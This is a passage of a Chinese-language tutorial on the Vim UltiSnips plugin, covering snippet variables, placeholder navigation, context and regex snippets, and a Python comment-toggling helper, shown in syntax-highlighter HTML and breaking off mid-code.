对象提供了下面一些变量：</p>\n<ul>\n<li><code>snip.rv</code> 表示 return value，python 代码执行后处理过的字符串赋给 rv 即可</li>\n<li><code>snip.fn</code> 表示当前文件名</li>\n<li><code>snip.ft</code> 表示当前文件类型</li>\n<li><code>snip.v</code> 表示 VISUAL 模式变量，其中 <code>snip.v.mode</code> 表示模式类型，<code>snip.v.text</code> 表示 VISUAL 模式中选择的字符</li>\n</ul>\n<p><img src=\"//img11.360buyimg.com/devfe/jfs/t27739/311/103185395/173892/d6a786e3/5b84af90Nfa6cd193.gif\" alt=\"python-snippet-var\"></p>\n<h2 id=\"占位符选择\">占位符选择</h2>\n<p>UltiSnips 支持使用快捷键切换占位符，我使用 <code>&lt;tab&gt;</code> 和 <code>&lt;shift-tab&gt;</code> 来切换 <code>下一个</code> 和 <code>上一个</code>占位符，占位符切换的作用域为当前代码片段内部（即使占位符已被修改过），当光标移动出去以后就不起作用了</p>\n<p><img src=\"//img12.360buyimg.com/devfe/jfs/t24559/158/2571218888/171431/2459a91d/5b84bf9aN96a7ee7e.gif\" alt=\"mul-placeholder-editing\"></p>\n<h2 id=\"自定义上下文\">自定义上下文</h2>\n<p>自定义上下文可以通过正则匹配来决定代码片断是否可用，比如判断在指定的 if 语句里面才起作用的代码片断，定义格式如下：</p>\n<blockquote><p>snippet 触发字符 “描述” “表达式” 参数</p></blockquote>\n<p>比如我们定义一个 <strong>只有</strong> 在上一行以 <code>if (DEVELOPMENT) {</code> 开头才可以展开的代码片段</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67066709a845722471\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsnippet dbg \"if (DEVELOPMENT) dbg\" \"re.match('^if <span class=\"MathJax_Preview\">\\(DEVELOPMENT\\)</span> \\{', snip.buffer[snip.line-1])\" be\r\ndebugger;\r\nendsnippet</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67066709a845722471-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67066709a845722471-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67066709a845722471-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67066709a845722471-1\"><span class=\"crayon-e\">snippet </span><span class=\"crayon-i\">dbg</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"if (DEVELOPMENT) dbg\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"re.match('^if <span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">DEVELOPMENT</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">)</span> \\{', snip.buffer[snip.line-1])\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">be</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67066709a845722471-2\"><span class=\"crayon-v\">debugger</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67066709a845722471-3\"><span class=\"crayon-v\">endsnippet</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p></p>\n<h2 id=\"常见用法\">常见用法</h2>\n<h3 id=\"行内连续展开\">行内连续展开</h3>\n<p>这个常见于需要连续展开代码片段的情况，比如，有两个片段，一个打印变量，一个处理 JSON 序列化。这时需要使用参数选项 <code>i</code>n-word</p>\n<p><img src=\"//img11.360buyimg.com/devfe/jfs/t25579/50/1036526670/419976/53521e3b/5b84c7d2Nd6a0cb5e.gif\" alt=\"continue-expand-snippets\"></p>\n<h3 id=\"使用正则代码片段\">使用正则代码片段</h3>\n<p>通常写代码的时候需要使用 log, print 等来打印上下文中的变量。使用普通片段按 cl 展示 console.log() 然后把变量字符复制进括号，这样操作会比较复杂。使用正则来动态匹配前面的字符可以很好的解决这个问题</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67066709e773834962\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# 展开 console.log\r\nsnippet \"([^\\s]\\w+)\\.log\" \"console.log(postfix)\" r\r\nconsole.log(`!p snip.rv = match.group(1)`)$0\r\nendsnippet\r\n# 当前行转换成大写\r\nsnippet \"([^\\s].*)\\.upper\" \"Uppercase(postfix)\" r\r\n`!p snip.rv = match.group(1).upper()`$0\r\nendsnippet\r\n# 上一个单词转换成小写\r\nsnippet \"([^\\s]\\w+)\\.lower\" \"Lowercase(postfix)\" r\r\n`!p snip.rv = match.group(1).lower()`$0\r\nendsnippet</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67066709e773834962-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67066709e773834962-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67066709e773834962-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67066709e773834962-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67066709e773834962-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67066709e773834962-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab67066709e773834962-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67066709e773834962-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab67066709e773834962-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67066709e773834962-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab67066709e773834962-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67066709e773834962-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67066709e773834962-1\"><span class=\"crayon-p\"># 展开 console.log</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67066709e773834962-2\"><span class=\"crayon-i\">snippet</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"([^\\s]\\w+)\\.log\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"console.log(postfix)\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line\" id=\"crayon-5bab67066709e773834962-3\"><span class=\"crayon-v\">console</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">`</span><span class=\"crayon-o\">!</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">match</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">group</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67066709e773834962-4\"><span class=\"crayon-v\">endsnippet</span></div><div class=\"crayon-line\" id=\"crayon-5bab67066709e773834962-5\"><span class=\"crayon-p\"># 当前行转换成大写</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67066709e773834962-6\"><span class=\"crayon-i\">snippet</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"([^\\s].*)\\.upper\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Uppercase(postfix)\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line\" id=\"crayon-5bab67066709e773834962-7\"><span class=\"crayon-sy\">`</span><span class=\"crayon-o\">!</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">match</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">group</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">upper</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67066709e773834962-8\"><span class=\"crayon-v\">endsnippet</span></div><div class=\"crayon-line\" id=\"crayon-5bab67066709e773834962-9\"><span class=\"crayon-p\"># 上一个单词转换成小写</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67066709e773834962-10\"><span class=\"crayon-i\">snippet</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"([^\\s]\\w+)\\.lower\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Lowercase(postfix)\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line\" id=\"crayon-5bab67066709e773834962-11\"><span class=\"crayon-sy\">`</span><span class=\"crayon-o\">!</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">match</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">group</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">lower</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67066709e773834962-12\"><span class=\"crayon-v\">endsnippet</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p>动图演示</p>\n<p><img src=\"//img30.360buyimg.com/devfe/jfs/t25492/223/971280921/61984/701b0ab1/5b84cc6aN6fe8ea04.gif\" alt=\"expand-regexp-snippets\"></p>\n<p><strong>注意</strong>：正则代码片段只适用于单行文本处理，如果是多行转换还是得用到下面的 python + VISUAL 代码片段来处理</p>\n<h3 id=\"使用-python-解释器-visual-模式实现代码注释功能\">使用 python 解释器 + VISUAL 模式实现代码注释功能</h3>\n<p>通常我们需要使用一大堆插件来实现各种代码的注释功能。不过 Ultisnips 提供了 VISUAL 模式可以提取 vim 可视模式中选择的内容到代码片段里面，于是我们就可以结合起来制作一个<strong>具有注释功能的代码片段</strong></p>\n<p>流程大概是这样的：</p>\n<ol>\n<li>进入 vim 可视模式，选择要注释的内容</li>\n<li>按 tab，清除选择内容</li>\n<li>输入代码片段触发字符，按 tab 完成</li>\n</ol>\n<p>由于实现的 python 代码相对复杂一些，主要分成两个方法。单行注释和多行注释，注意 Ultisnips 中可以直接写 python 但是大段的方法建议放在插件目录下面的 pythonx 目录下面，使用的时候在对应的代码片段中的全局 python 代码 <code>global !p</code> 引入即可</p>\n<p><strong>单行注释</strong>(pythonx/javascript_snippets.py)：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6706670a2996110744\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef comment(snip, START=\"\", END=\"\"):\r\n    lines = snip.v.text.split('\\n')[:-1]\r\n    first_line = lines[0]\r\n    spaces = ''\r\n    initial_indent = snip._initial_indent\r\n\r\n    # Get the first non-empty line\r\n    for idx, l in enumerate(lines):\r\n        if l.strip() != '':\r\n            first_line = lines[idx]\r\n            sp = re.findall(r'^\\s+', first_line)\r\n            if len(sp):\r\n                spaces = sp[0]\r\n            break            \r\n\r\n    # Uncomment\r\n    if first_line.strip().startswith(START):\r\n        result = [line.replace(START, \"\", 1).replace(END, \"\", 1) if line.strip() else line for line in lines]\r\n    else:\r\n        result = [f'{spaces}{START}{line[len(spaces):]}{END}' if line.strip() else line for line in lines ]\r\n\r\n    # Remove initial indent\r\n    if result[0] and initial_indent:\r\n        result[0] = result[0].replace(initial_indent, '', 1)\r\n\r\n    if result:\r\n        return '\\n'.join(result)\r\n    else:\r\n        return ''</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6706670a2996110744-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5bab6706670a2996110744-29\">29</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">comment</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">START</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">END</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">lines</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">text</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">split</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'\\n'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">first_line</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lines</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">spaces</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">''</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">initial_indent</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">snip</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">_initial_indent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># Get the first non-empty line</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">enumerate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">lines</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">l</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">strip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">''</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-10\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">first_line</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lines</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-11\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">sp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">re</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">findall</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">r</span><span class=\"crayon-s\">'^\\s+'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">first_line</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-13\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">spaces</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sp</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">break</span><span class=\"crayon-h\">            </span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># Uncomment</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">first_line</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">strip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">startswith</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">START</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6706670a2996110744-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">result</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">line</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">replace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">START</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">replace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-st\">END</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">line</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">strip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">line </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">line </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lines</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6706670a2996110744-19\"><span 